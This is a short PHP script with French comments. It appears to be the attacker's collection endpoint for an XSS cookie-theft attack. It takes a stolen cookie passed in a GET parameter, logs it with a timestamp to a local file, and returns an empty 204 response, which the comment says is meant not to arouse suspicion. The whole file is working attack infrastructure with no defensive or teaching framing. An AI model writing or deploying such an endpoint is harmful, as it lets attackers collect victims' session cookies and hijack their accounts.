<?php

    // Récupérer les données envoyées par le XSS
    $data = $_GET['cookie'] ?? 'No data received';

    // Stocker les données dans un fichier
    $file = 'data.txt';
    file_put_contents($file, date("Y-m-d H:i:s") . " - " . urldecode($data) . PHP_EOL, FILE_APPEND);

    // Afficher une réponse vide pour ne pas éveiller de soupçons
    http_response_code(204);

?>
